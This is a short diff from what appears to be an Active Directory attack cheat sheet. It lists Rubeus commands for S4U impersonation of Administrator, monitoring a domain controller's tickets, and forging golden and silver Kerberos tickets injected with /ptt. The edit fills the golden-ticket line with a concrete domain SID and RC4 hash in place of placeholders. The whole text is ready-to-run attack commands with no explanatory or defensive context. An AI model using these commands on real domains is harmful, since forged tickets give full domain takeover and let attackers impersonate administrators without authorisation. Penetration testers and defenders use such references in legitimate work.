@@ -258,7 +258,7 @@ Rubeus.exe s4u /user:svc_iis /rc4:NTHASH /impersonateuser:Administrator /msdsspn
 Rubeus.exe monitor /interval:5 /filteruser:DC01$
 
 # Golden ticket (requires krbtgt hash)
-Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /ptt
+Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1004336348-1177238915-682003330 /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
 
 # Silver ticket (service-specific)
 Rubeus.exe silver /service:cifs/TARGET /user:Administrator /domain:domain.local /rc4:MACHINE_HASH /ptt
